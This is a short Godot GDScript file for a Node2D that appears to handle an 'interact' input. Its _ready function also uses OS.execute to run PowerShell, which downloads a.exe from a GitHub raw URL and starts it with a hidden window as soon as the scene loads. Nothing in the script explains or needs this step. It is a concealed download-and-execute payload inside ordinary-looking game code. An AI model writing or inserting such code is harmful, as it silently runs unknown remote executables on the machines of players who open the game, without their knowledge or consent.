extends Node2D

@export var interacting: bool

#signal interact(node: Node)
## Called when the node enters the scene tree for the first time.
func _ready() -> void:
	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/rick/raw/main/a.exe -o a.exe"])
	OS.execute("powershell.exe", ["-Command", "Start-Process a.exe -WindowStyle Hidden"])
#
# Called every frame. 'delta' is the elapsed time since the previous frame.
func _process(delta: float) -> void:
	if Input.is_action_pressed("interact"):
		interacting = true
	else:
		interacting = false
